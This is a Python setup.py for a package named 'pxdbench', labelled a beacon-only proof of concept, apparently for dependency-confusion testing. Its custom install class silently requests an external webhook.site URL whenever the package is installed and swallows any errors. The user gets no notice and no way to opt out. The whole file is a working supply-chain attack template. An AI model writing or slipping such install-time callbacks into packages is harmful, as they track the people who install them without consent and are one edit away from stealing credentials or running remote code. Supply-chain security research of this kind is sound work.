from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/6cf7513a-088e-4b23-86a2-6a989ce053ea"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="pxdbench",
    version="0.1.0",
    packages=["pxdbench"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
